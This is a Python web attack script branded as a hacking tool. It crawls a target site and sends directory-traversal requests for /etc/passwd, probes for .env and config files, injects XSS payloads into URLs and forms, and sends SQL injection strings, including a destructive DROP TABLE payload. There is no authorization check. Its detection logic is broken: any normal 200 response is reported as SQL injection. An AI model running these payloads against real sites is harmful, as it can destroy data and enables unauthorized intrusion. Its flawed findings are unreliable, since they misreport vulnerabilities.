import requests
from bs4 import BeautifulSoup
import argparse
import urllib.parse
import time
import sys
import os
import urllib.parse
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
FOUND_VULS_FILE = 'found_vuls.txt'
EXPLOITABLE_FILE = 'exploitable.txt'
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"
os.system('clear')

print(r"""
         ___--=--------___
        /. \___\____   _, \_      /-\
       /. .  _______     __/=====@
       \----/  |  / \______/      \-/
   _/         _/ o \
  / |    o   /  ___ \
 / /    o\\ |  / O \ /|      __-_
|o|     o\\\   |  \ \ /__--o/o___-_
| |      \\\-_  \____  ----  o___-
|o|       \_ \     /\______-o\_-
| \       _\ \  _/ / |
\o \_   _/      __/ /
 \   \-/   _       /|_
  \_      / |   - \  |\
    \____/  \ | /  \   |\
            | o |   | \ |
            | | |    \ | \
           / | /      \ \ \
         /|  \o|\--\  /  o |\--\
         \----------' \---------'


""")
print(f"{RED}Nihility's Scanner\nHacking your site. {RESET}")
time.sleep(2)


def log_found_vuln(message):
    with open(FOUND_VULS_FILE, 'a') as f:
        f.write(message + "\n")

def log_exploitable(message):
    with open(EXPLOITABLE_FILE, 'a') as f:
        f.write(message + "\n")

def print_and_log(msg, vuln_desc=None, color=bcolors.OKGREEN):
    print(f"{color}{msg}{bcolors.ENDC}")
    if vuln_desc:
        log_found_vuln(vuln_desc)

def print_error(msg):
    print(f"{bcolors.FAIL}{msg}{bcolors.ENDC}")

def print_forbidden(msg):
    print(f"{bcolors.OKBLUE}{msg}{bcolors.ENDC}")

def crawl_site(start_url, max_pages=50):
    visited = set()
    to_visit = [start_url]
    base_domain = urllib.parse.urlparse(start_url).netloc

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        if url in visited:
            continue
        print_forbidden(f"Crawling: {url}")
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 403:
                print_forbidden(f"Forbidden: {url}")
                continue
        except requests.RequestException:
            print_error(f"Request failed: {url}")
            continue
        visited.add(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urllib.parse.urljoin(url, href)
            parsed_url = urllib.parse.urlparse(full_url)
            if parsed_url.netloc == base_domain:
                if full_url not in visited and full_url not in to_visit:
                    to_visit.append(full_url)
        time.sleep(0.2)
    return list(visited)

def check_open_directory(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and "Index of" in response.text:
            msg = f"[!] Open directory listing at {url}"
            print_and_log(msg, msg, color=bcolors.WARNING)
    except requests.RequestException:
        pass

def check_directory_traversal(url):
    payloads = ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"]
    for payload in payloads:
        test_url = url + '?' + urllib.parse.urlencode({'file': payload})
        try:
            response = requests.get(test_url, timeout=5)
            if "root:x:" in response.text or "password" in response.text:
                msg = f"[!] Possible Directory Traversal at {test_url}"
                print_and_log(msg, msg, color=bcolors.FAIL)
        except requests.RequestException:
            pass

def check_sensitive_files(base_url):
    files = ['config.php', '.env', 'admin.php', 'backup.zip']
    for filename in files:
        url = urllib.parse.urljoin(base_url, filename)
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                msg = f"[!] Found sensitive file: {url}"
                print_and_log(msg, msg, color=bcolors.WARNING)
        except requests.RequestException:
            pass

def check_missing_security_headers(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        security_headers = [
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'Strict-Transport-Security',
            'X-XSS-Protection'
        ]
        for header in security_headers:
            if header not in headers:
                msg = f"[!] Missing header {header} at {url}"
                print_and_log(msg, msg, color=bcolors.FAIL)
    except requests.RequestException:
        pass

def check_https(url):
    if url.startswith("http://"):
        msg = f"[!] Website does not use HTTPS: {url}"
        print_and_log(msg, msg, color=bcolors.WARNING)

def check_title_and_meta(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.title.string if soup.title else 'No title found'
        print(f"Page Title: {title}")
    except requests.RequestException:
        pass

def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        '" OR "1"="1',
        "'; DROP TABLE users; --",
        "' OR 1=1--",
        "\" OR 1=1--"
    ]
    vulnerable = False
    for payload in payloads:
        test_url = url + '?' + urllib.parse.urlencode({'id': payload})
        try:
            response = requests.get(test_url, timeout=5)
            text_lower = response.text.lower()
            if "sql syntax" in text_lower or "mysql" in text_lower or response.status_code in [500, 200]:
                msg = f"[!] Possible SQL Injection at {test_url} with payload: {payload}"
                print_and_log(msg, msg, color=bcolors.FAIL)
                log_exploitable(msg)
                vulnerable = True
        except requests.RequestException:
            pass
    if not vulnerable:
        print_and_log("[*] No obvious SQLi detected with basic payloads.", color=bcolors.OKGREEN)


def test_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "'><svg/onload=alert(1)>"
    ]
    vulnerable = False
    for payload in payloads:
        test_url = url + '?' + urllib.parse.urlencode({'search': payload})
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                msg = f"[!] Possible XSS at {test_url} with payload: {payload}"
                print_and_log(msg, msg, color=bcolors.FAIL)
                log_exploitable(msg)
                vulnerable = True
        except requests.RequestException:
            pass
    if not vulnerable:
        print_and_log("[*] No obvious XSS detected with basic payloads.", color=bcolors.OKGREEN)

def get_forms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException:
        return []

def test_form_xss_and_injection(url):
    forms = get_forms(url)
    for form in forms:
        form_details = {
            "action": form.get('action'),
            "method": form.get('method', 'get').lower()
        }
        inputs = form.find_all('input')
        data = {}
        for input in inputs:
            name = input.get('name')
            if not name:
                continue
            data[name] = "<script>alert('XSS')</script>"
        form_url = urllib.parse.urljoin(url, form_details['action'])
        try:
            if form_details['method'] == 'post':
                response = requests.post(form_url, data=data, timeout=5)
            else:
                response = requests.get(form_url, params=data, timeout=5)
            if "<script>alert('XSS')</script>" in response.text:
                msg = f"[!] Potential XSS via form at {form_url}"
                print_and_log(msg, msg, color=bcolors.FAIL)
        except requests.RequestException:
            pass

def exploit_form_fields_for_xss(url):
    forms = get_forms(url)
    payload = "<script>alert('XSS_Nihility')</script>"
    exploited = False
    for form in forms:
        form_details = {
            "action": form.get('action'),
            "method": form.get('method', 'get').lower()
        }
        inputs = form.find_all('input')
        data = {}
        for input in inputs:
            name = input.get('name')
            if not name:
                continue
            data[name] = payload
        form_url = urllib.parse.urljoin(url, form_details['action'])
        try:
            if form_details['method'] == 'post':
                response = requests.post(form_url, data=data, timeout=5)
            else:
                response = requests.get(form_url, params=data, timeout=5)
            if payload in response.text:
                msg = f"[!] Exploited XSS via form at {form_url}"
                print_and_log(msg, msg, color=bcolors.OKGREEN)
                exploited = True
        except requests.RequestException:
            pass
    if not exploited:
        print("[*] Failed to exploit XSS via forms.")


def check_url_for_vulns(url):
    check_https(url)
    check_open_directory(url)
    check_missing_security_headers(url)
    check_title_and_meta(url)
    test_sql_injection(url)
    test_xss(url)
    test_form_xss_and_injection(url)
    print("\nAttempting to exploit forms for XSS (if possible)...\n")
    exploit_form_fields_for_xss(url)


def run_extra_checks(base_url):
    check_sensitive_files(base_url)
    check_directory_traversal(base_url)

def main():
    parser = argparse.ArgumentParser(description="Enhanced Vulnerability Scanner")
    parser.add_argument('-s', '--scan', action='store_true', help='Scan entire site')
    parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
    args = parser.parse_args()

    start_url = args.url
    if not start_url.startswith("http"):
        start_url = "http://" + start_url


    open(FOUND_VULS_FILE, 'w').close()
    open(EXPLOITABLE_FILE, 'w').close()

    if args.scan:
        print(f"{bcolors.HEADER}Crawling the site starting at {start_url}...{bcolors.ENDC}")
        all_urls = crawl_site(start_url, max_pages=100)
        print(f"{bcolors.HEADER}Found {len(all_urls)} URLs. Starting scan...{bcolors.ENDC}")
        for url in all_urls:
            print(f"{bcolors.HEADER}--- Scanning: {url} ---{bcolors.ENDC}")
            check_url_for_vulns(url)
            run_extra_checks(url)
            print("\n" + "="*50 + "\n")
            time.sleep(0.5)

if __name__ == "__main__":
    main()